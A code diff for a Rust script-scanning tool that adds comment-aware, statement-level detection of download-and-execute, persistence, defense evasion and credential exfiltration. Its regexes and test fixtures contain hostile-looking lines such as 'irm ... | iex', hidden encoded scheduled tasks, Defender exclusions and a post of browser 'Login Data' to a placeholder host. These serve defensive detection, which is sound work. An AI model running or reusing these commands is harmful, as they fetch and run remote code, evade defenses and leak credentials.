@@ -457,15 +457,281 @@ fn derive(text: &str, is_batch: bool, budget: &Budget) -> Derivations {
     out
 }
 
-fn analyze_layer(layer: &Layer, report: &mut Report) {
-    let text = &layer.text;
+/// Script language, from the file extension. Decides how comments are found.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Lang {
+    PowerShell,
+    Python,
+    JavaScript,
+    Batch,
+    Vbs,
+    /// Unknown syntax (including decoded layers): nothing is treated as a comment.
+    Other,
+}
+
+impl Lang {
+    fn from_path(path: &str) -> Self {
+        let ext = path.rsplit('.').next().unwrap_or("");
+        match ext {
+            "ps1" | "psm1" | "psd1" => Self::PowerShell,
+            "py" | "pyw" => Self::Python,
+            "js" | "mjs" | "cjs" | "jse" => Self::JavaScript,
+            "bat" | "cmd" => Self::Batch,
+            "vbs" | "vbe" => Self::Vbs,
+            _ => Self::Other,
+        }
+    }
+}
+
+fn blank(c: char) -> char {
+    if c == '\n' {
+        '\n'
+    } else {
+        ' '
+    }
+}
+
+/// Split text into (code, comments). Comment characters are blanked in
+/// `code` (line layout is kept) and collected in `comments`. Quotes are
+/// tracked so `#` or `//` inside string literals are not comments.
+/// Unterminated block comments stay code, so nothing is hidden by them.
+fn split_comments(text: &str, lang: Lang) -> (String, String) {
+    if lang == Lang::Other {
+        return (text.to_owned(), String::new());
+    }
+    let mut code = String::with_capacity(text.len());
+    let mut comments = String::new();
+    if matches!(lang, Lang::Batch | Lang::Vbs) {
+        for line in text.split_inclusive('\n') {
+            let trimmed = line.trim_start().to_ascii_lowercase();
+            let is_comment = match lang {
+                Lang::Batch => {
+                    trimmed.starts_with("::")
+                        || trimmed.starts_with("rem ")
+                        || trimmed.starts_with("@rem ")
+                        || trimmed.trim_end() == "rem"
+                }
+                _ => trimmed.starts_with('\'') || trimmed.starts_with("rem "),
+            };
+            if is_comment {
+                comments.push_str(line);
+                code.extend(line.chars().map(blank));
+            } else {
+                code.push_str(line);
+            }
+        }
+        return (code, comments);
+    }
+    let chars: Vec<char> = text.chars().collect();
+    let (line_start, block_start, block_end): (&[char], &[char], &[char]) = match lang {
+        Lang::PowerShell => (&['#'], &['<', '#'], &['#', '>']),
+        Lang::JavaScript => (&['/', '/'], &['/', '*'], &['*', '/']),
+        _ => (&['#'], &[], &[]),
+    };
+    let escape = if lang == Lang::PowerShell { '`' } else { '\\' };
+    let at = |i: usize, pat: &[char]| !pat.is_empty() && chars[i..].starts_with(pat);
+    let mut quote: Option<char> = None;
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        if let Some(q) = quote {
+            code.push(c);
+            if c == escape && i + 1 < chars.len() {
+                code.push(chars[i + 1]);
+                i += 2;
+                continue;
+            }
+            // Ordinary quotes end at the line end; JS template literals do not.
+            if c == q || (c == '\n' && q != '`') {
+                quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        if at(i, block_start) {
+            let body = i + block_start.len();
+            if let Some(len) = chars[body..]
+                .windows(block_end.len())
+                .position(|w| w == block_end)
+            {
+                let end = body + len + block_end.len();
+                for &ch in &chars[i..end] {
+                    comments.push(ch);
+                    code.push(blank(ch));
+                }
+                comments.push('\n');
+                i = end;
+                continue;
+            }
+        }
+        if at(i, line_start) {
+            while i < chars.len() && chars[i] != '\n' {
+                comments.push(chars[i]);
+                code.push(' ');
+                i += 1;
+            }
+            comments.push('\n');
+            continue;
+        }
+        if c == '"' || c == '\'' || (c == '`' && lang == Lang::JavaScript) {
+            quote = Some(c);
+        }
+        code.push(c);
+        i += 1;
+    }
+    (code, comments)
+}
+
+const MAX_STATEMENTS: usize = 200_000;
+
+/// Logical statements: lines joined across explicit continuations, split on `;`.
+/// Capped; the caller marks the analysis incomplete when the cap is reached.
+fn statements(code: &str) -> (Vec<String>, bool) {
+    let mut out = Vec::new();
+    let mut current = String::new();
+    let flush = |current: &mut String, out: &mut Vec<String>| {
+        out.extend(
+            current
+                .split(';')
+                .map(str::trim)
+                .filter(|s| !s.is_empty())
+                .map(str::to_owned),
+        );
+        current.clear();
+    };
+    for line in code.lines() {
+        let trimmed = line.trim_end();
+        current.push_str(trimmed);
+        current.push(' ');
+        let continues = ['`', '\\', '|', '(', ',', '+', '{']
+            .iter()
+            .any(|&c| trimmed.ends_with(c));
+        if !continues || current.len() > 64 * 1024 {
+            flush(&mut current, &mut out);
+        }
+        if out.len() >= MAX_STATEMENTS {
+            out.truncate(MAX_STATEMENTS);
+            return (out, true);
+        }
+    }
+    flush(&mut current, &mut out);
+    let capped = out.len() > MAX_STATEMENTS;
+    out.truncate(MAX_STATEMENTS);
+    (out, capped)
+}
+
+/// Content fetched into memory (not only saved to a file).
+static FETCH_CONTENT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)DownloadString|DownloadData|\bInvoke-RestMethod\b|\birm\b|requests\.get|httpx\.get|urlopen|urllib\.request|\bfetch\s*\(|XMLHttpRequest|MSXML2\.XMLHTTP|WinHttp|\bInvoke-WebRequest\b[^\r\n;|]*\.Content|\biwr\b[^\r\n;|]*\.Content").unwrap()
+});
+/// Executes a string as code (not a separate, named program).
+static CODE_EXEC: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)\biex\b|Invoke-Expression|\beval\s*\(|\bexec\s*\(|new\s+Function\s*\(|\bFunction\s*\(|ScriptBlock\]::Create|\bExecute(?:Global)?\b|shell\s*=\s*True|\bos\.system\s*\(|\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*\s-c(?:ommand)?\b").unwrap()
+});
+static ASSIGN: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^\s*(?:(?:const|let|var|Set)\s+)?\$?([A-Za-z_][A-Za-z0-9_]{0,63})\s*=[^=]")
+        .unwrap()
+});
+static IDENT: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[A-Za-z_][A-Za-z0-9_]{0,63}").unwrap());
+/// Task or service creation, which is common in administration.
+static TASK_OR_SERVICE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)schtasks(?:\.exe)?\s+/create|Register-ScheduledTask|New-ScheduledTask|New-Service|\bsc(?:\.exe)?\s+create\b").unwrap()
+});
+static RUN_KEY: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)CurrentVersion[\\/]+Run(?:Once)?\b").unwrap());
+/// What a persisted command runs that makes it unusual for administration.
+static RISKY_TARGET: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)\b(?:powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)(?:\.exe)?\b|cmd(?:\.exe)?\s+/c|-enc(?:odedcommand)?\b|-w(?:indowstyle)?\s+hidden|%(?:temp|appdata|localappdata)%|\$env:(?:temp|appdata|localappdata)|\\AppData\\|\\Users\\Public\\|https?://").unwrap()
+});
+
+/// Signs that a download is staged like a dropper rather than an installer:
+/// plain HTTP, an IP-literal URL, a user-writable/temporary location or a
+/// hidden window.
+static STAGING: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)http://|https?://\d{1,3}(?:\.\d{1,3}){3}|%(?:temp|appdata|localappdata)%|\$env:(?:temp|appdata|localappdata)|\\AppData\\|\\Users\\Public\\|gettempfolder|tempfile|/tmp/|-w(?:indowstyle)?\s+hidden").unwrap()
+});
+
+/// Facts about one analyzed text, used to emit signals.
+#[derive(Default)]
+struct Findings {
+    credentials: bool,
+    sends: bool,
+    evasion: bool,
+    task_or_service: bool,
+    risky_persistence: bool,
+    download: bool,
+    exec: bool,
+    /// Fetched content flows into code execution in the same statement or
+    /// through a variable assigned (directly or transitively) from a fetch.
+    fetch_to_exec: bool,
+    staging: bool,
+    statements_capped: bool,
+}
+
+fn findings(code: &str) -> Findings {
+    let (statements, statements_capped) = statements(code);
+    let mut tainted: HashSet<String> = HashSet::new();
+    let mut fetch_to_exec = false;
+    let mut risky_persistence = RUN_KEY.is_match(code);
+    for stmt in &statements {
+        let fetches = FETCH_CONTENT.is_match(stmt);
+        let (target, rhs) = match ASSIGN.captures(stmt) {
+            Some(c) => {
+                let name = c.get(1).map_or("", |m| m.as_str());
+                let after = c.get(1).map_or(0, |m| m.end());
+                // `=` is ASCII, so the index after it is a char boundary.
+                let rhs = stmt[after..]
+                    .find('=')
+                    .map_or("", |i| &stmt[after + i + 1..]);
+                (Some(name.to_ascii_lowercase()), rhs)
+            }
+            None => (None, stmt.as_str()),
+        };
+        let uses_tainted = !tainted.is_empty()
+            && IDENT
+                .find_iter(rhs)
+                .any(|m| tainted.contains(&m.as_str().to_ascii_lowercase()));
+        if CODE_EXEC.is_match(stmt) && (fetches || uses_tainted) {
+            fetch_to_exec = true;
+        }
+        if let Some(name) = target {
+            if fetches || uses_tainted {
+                if tainted.len() < 256 {
+                    tainted.insert(name);
+                }
+            } else {
+                tainted.remove(&name);
+            }
+        }
+        if TASK_OR_SERVICE.is_match(stmt) && RISKY_TARGET.is_match(stmt) {
+            risky_persistence = true;
+        }
+    }
+    Findings {
+        credentials: CREDENTIAL.is_match(code),
+        sends: SEND.is_match(code) && NETWORK.is_match(code),
+        evasion: EVASION.is_match(code),
+        task_or_service: TASK_OR_SERVICE.is_match(code) || PERSISTENCE.is_match(code),
+        risky_persistence,
+        download: DOWNLOAD.is_match(code) || FETCH_CONTENT.is_match(code),
+        exec: EXEC.is_match(code) || CODE_EXEC.is_match(code),
+        fetch_to_exec,
+        staging: STAGING.is_match(code),
+        statements_capped,
+    }
+}
+
+fn analyze_layer(layer: &Layer, lang: Lang, report: &mut Report) {
     let source = layer.origin.as_str();
-    let credentials = CREDENTIAL.is_match(text);
-    let sends = SEND.is_match(text) && NETWORK.is_match(text);
-    let evasion = EVASION.is_match(text);
-    let persistence = PERSISTENCE.is_match(text);
-    let download_execute = DOWNLOAD.is_match(text) && EXEC.is_match(text);
-    if credentials && sends {
+    // Decoded layers have no reliable syntax; they are analyzed whole.
+    let lang = if layer.depth == 0 { lang } else { Lang::Other };
+    let (code, comments) = split_comments(&layer.text, lang);
+    let f = findings(&code);
+    if f.statements_capped {
+        report.mark_incomplete("statement_limit");
+    }
+    if f.credentials && f.sends {
         report.add(
             "possible_exfiltration",
             75,
@@ -473,7 +739,7 @@ fn analyze_layer(layer: &Layer, report: &mut Report) {
             "Browser credential references combined with an outbound send capability",
         );
     }
-    if evasion {
+    if f.evasion {
         report.add(
             "defense_evasion",
             60,
@@ -481,23 +747,44 @@ fn analyze_layer(layer: &Layer, report: &mut Report) {
             "Defender exclusions, AMSI tampering or log clearing indicators",
         );
     }
-    if persistence {
+    if f.risky_persistence {
         report.add(
             "persistence",
             30,
             source,
-            "Persistence-related commands or registry references",
+            "Run-key persistence, or a task/service that runs a script host, a hidden or encoded command, a user-writable path or a URL",
+        );
+    } else if f.task_or_service {
+        report.add(
+            "persistence_admin_task",
+            15,
+            source,
+            "Creates a scheduled task or service (common in administration; check what it runs)",
         );
     }
-    if download_execute {
+    if f.fetch_to_exec {
         report.add(
             "download_and_execute",
             45,
             source,
-            "Downloader and process/code execution capabilities appear together",
+            "Content fetched from the network flows into code execution",
+        );
+    } else if f.download && f.exec && f.staging {
+        report.add(
+            "download_and_run_staged",
+            35,
+            source,
+            "Downloads and starts processes using plain HTTP, an IP address, a temporary or user-writable path or a hidden window",
+        );
+    } else if f.download && f.exec {
+        report.add(
+            "download_and_run",
+            20,
+            source,
+            "Downloads and starts processes; no flow from fetched content into code execution was found statically",
         );
     }
-    if layer.depth > 0 && (credentials || evasion || persistence) {
+    if layer.depth > 0 && (f.credentials || f.evasion || f.task_or_service || f.risky_persistence) {
         report.add(
             "hidden_sensitive_behavior",
             25,
@@ -505,13 +792,32 @@ fn analyze_layer(layer: &Layer, report: &mut Report) {
             "A decoded layer contains sensitive or evasive behavior",
         );
     }
-    if layer.depth == 0 && ENCODED_EXEC.is_match(text) && EXEC.is_match(text) {
+    if layer.depth == 0
+        && ENCODED_EXEC.is_match(&code)
+        && (EXEC.is_match(&code) || CODE_EXEC.is_match(&code))
+    {
         report.add(
             "encoded_execution",
             25,
             source,
             "Encoded content appears to be passed into an execution mechanism",
         );
+    }
+    if !comments.is_empty() {
+        let c = findings(&comments);
+        let persists = |x: &Findings| x.task_or_service || x.risky_persistence;
+        if (c.credentials && !f.credentials)
+            || (c.evasion && !f.evasion)
+            || (persists(&c) && !persists(&f))
+            || (c.download && c.exec && !(f.download && f.exec))
+        {
+            report.add(
+                "indicator_in_comment_only",
+                5,
+                source,
+                "Sensitive indicators appear only in comments, which are not executed",
+            );
+        }
     }
 }
 
@@ -544,6 +850,7 @@ pub fn inspect_layers(
     };
     let path = report.path.to_ascii_lowercase();
     let is_batch = path.ends_with(".bat") || path.ends_with(".cmd");
+    let lang = Lang::from_path(&path);
     report.analyzer("script_signatures");
     report.analyzer("script_deobfuscation");
     let mut queue = VecDeque::from([Layer {
@@ -568,7 +875,7 @@ pub fn inspect_layers(
             continue;
         }
         processed += 1;
-        analyze_layer(&layer, report);
+        analyze_layer(&layer, lang, report);
         if layer.depth > 0 {
             visit(
                 report,
@@ -634,6 +941,140 @@ mod tests {
     fn benign_code_has_no_signals() {
         let r = scan("print('hello world')", "x.py");
         assert_eq!(r.score, 0);
+    }
+
+    // --- P5-02: statement- and comment-aware signals ---
+
+    #[test]
+    fn indicators_only_in_comments_are_informational() {
+        let r = scan(
+            "# Never IEX (New-Object Net.WebClient).DownloadString('x')\n<# Add-MpPreference -ExclusionPath C:\\ #>\nGet-Date\n",
+            "a.ps1",
+        );
+        assert!(has(&r, "indicator_in_comment_only"));
+        assert!(!has(&r, "defense_evasion"));
+        assert!(!has(&r, "download_and_execute"));
+        assert_eq!(r.risk, "low_signal");
+    }
+
+    #[test]
+    fn hash_and_slashes_inside_strings_are_not_comments() {
+        let r = scan(
+            "$u = 'https://x.invalid/#frag'; Add-MpPreference -ExclusionPath C:\\\n",
+            "a.ps1",
+        );
+        assert!(has(&r, "defense_evasion"));
+        let js = scan(
+            "const u = \"http://a.invalid//x\"; eval(await fetch(u))\n",
+            "a.js",
+        );
+        assert!(has(&js, "download_and_execute"));
+    }
+
+    #[test]
+    fn unterminated_block_comment_does_not_hide_code() {
+        let r = scan(
+            "<# not closed\nAdd-MpPreference -ExclusionPath C:\\\n",
+            "a.ps1",
+        );
+        assert!(has(&r, "defense_evasion"));
+    }
+
+    #[test]
+    fn fetched_content_into_code_execution_is_review() {
+        for (code, path) in [
+            ("IEX (New-Object Net.WebClient).DownloadString('https://x.invalid')", "a.ps1"),
+            ("irm https://x.invalid | iex", "a.ps1"),
+            ("$s = (New-Object Net.WebClient).DownloadString('https://x.invalid')\n$t = $s.Trim()\nInvoke-Expression $t", "a.ps1"),
+            ("import requests\nbody = requests.get('https://x.invalid').text\nexec(body)", "a.py"),
+            ("const r = await fetch('https://x.invalid');\nconst t = await r.text();\neval(t);", "a.js"),
+        ] {
+            let r = scan(code, path);
+            assert!(has(&r, "download_and_execute"), "{code}");
+            assert!(r.score >= 25, "{code}");
+        }
+    }
+
+    #[test]
+    fn reassigned_variable_is_no_longer_tainted() {
+        let r = scan(
+            "import requests, subprocess\nv = requests.get('https://x.invalid').text\nv = 'git'\nexec('print(1)')\nsubprocess.run([v, 'pull'])",
+            "a.py",
+        );
+        assert!(!has(&r, "download_and_execute"));
+        assert!(has(&r, "download_and_run"));
+    }
+
+    #[test]
+    fn installer_download_and_run_is_low_signal_but_recorded() {
+        let r = scan(
+            "Invoke-WebRequest -Uri 'https://dl.example.invalid/t.msi' -OutFile t.msi\nStart-Process msiexec.exe -ArgumentList '/i t.msi /qn' -Wait\n",
+            "a.ps1",
+        );
+        assert!(has(&r, "download_and_run"));
+        assert_eq!(r.risk, "low_signal");
+    }
+
+    #[test]
+    fn staged_download_and_run_is_review() {
+        let r = scan(
+            "Invoke-WebRequest -Uri 'http://198.51.100.7/a.exe' -OutFile $env:TEMP\\a.exe\nStart-Process $env:TEMP\\a.exe -WindowStyle Hidden\n",
+            "a.ps1",
+        );
+        assert!(has(&r, "download_and_run_staged"));
+        assert_eq!(r.risk, "review");
+    }
+
+    #[test]
+    fn admin_task_is_low_but_risky_persistence_is_review() {
+        let admin = scan(
+            "Register-ScheduledTask -TaskName 'Cleanup' -Action (New-ScheduledTaskAction -Execute 'cleanmgr.exe')",
+            "a.ps1",
+        );
+        assert!(has(&admin, "persistence_admin_task"));
+        assert_eq!(admin.risk, "low_signal");
+        for code in [
+            "schtasks /create /tn U /tr \"powershell -w hidden -enc AAAA\" /sc onlogon",
+            "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name U -Value x",
+            "New-Service -Name U -BinaryPathName 'C:\\Users\\Public\\u.exe'",
+        ] {
+            let r = scan(code, "a.ps1");
+            assert!(has(&r, "persistence"), "{code}");
+            assert_eq!(r.risk, "review", "{code}");
+        }
+    }
+
+    #[test]
+    fn batch_and_vbs_comment_lines_are_recognized() {
+        let bat = scan(
+            "@echo off\nrem schtasks /create /tn x /tr powershell\n:: Clear-EventLog\necho ok\n",
+            "a.bat",
+        );
+        assert!(has(&bat, "indicator_in_comment_only"));
+        assert_eq!(bat.risk, "low_signal");
+        let vbs = scan("' Clear-EventLog\nWScript.Echo 1\n", "a.vbs");
+        assert!(!has(&vbs, "defense_evasion"));
+    }
+
+    #[test]
+    fn credential_exfiltration_still_detected_across_statements() {
+        let r = scan(
+            "import requests\nname = 'Login Data'\n\nrequests.post('https://x.invalid', data=name)\n",
+            "a.py",
+        );
+        assert!(has(&r, "possible_exfiltration"));
+        assert_eq!(r.risk, "high");
+    }
+
+    #[test]
+    fn statement_split_is_bounded_and_char_safe() {
+        let (s, capped) = statements("a=1;b=\u{00e9}=2;\n`\ncontinued");
+        assert!(!capped);
+        assert!(s.iter().any(|x| x.contains('\u{00e9}')));
+        let many = "x;".repeat(MAX_STATEMENTS + 10);
+        let (s, capped) = statements(&many);
+        assert!(capped);
+        assert_eq!(s.len(), MAX_STATEMENTS);
     }
     #[test]
     fn browser_credential_exfiltration_detected() {
